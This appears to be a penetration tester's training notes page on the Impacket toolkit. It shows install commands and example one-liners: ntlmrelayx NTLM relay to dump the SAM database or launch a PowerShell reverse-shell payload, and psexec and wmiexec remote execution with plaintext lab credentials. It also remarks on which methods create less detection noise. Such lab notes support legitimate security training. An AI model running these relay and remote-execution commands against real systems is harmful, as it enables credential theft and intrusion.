impacket Description
**********************

A utility package 

impacket installation
***********************

.. code-block:: console 

    snap install impacket

.. code-block:: console

    git clone https://github.com/fortra/impacket
    pip install impacket
    pip install pycryptodome

impacket usage
*****************

impacket-ntlmrelayx
=====================

Example 1:  Default will dump the SAM database

.. code-block:: console

    impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

Example 2: Running a powershell payload (requires a listener and revshells.com)

.. code-block:: console

    impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e '



impacket-psexec
===============

Example:  impacket-psexec

.. code-block:: console
    
    impacket-psexec administrator:'Password123!'@10.10.110.17

    impacket-psexec inlanefreight.local/wley:'transporter@4'@172.16.5.125  

impacket-wmiexec
=================
Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation (:ref:`wmi`)
This utility creates the least amount of noise.

Example:

.. code-block:: bash

    impacket-wmiexec inlanefreight.local/wley:'transporter@4'@172.16.5.5  

.. note:: Everytime a command is issued it spawns a new cms.exe process.  This may create detection risk.
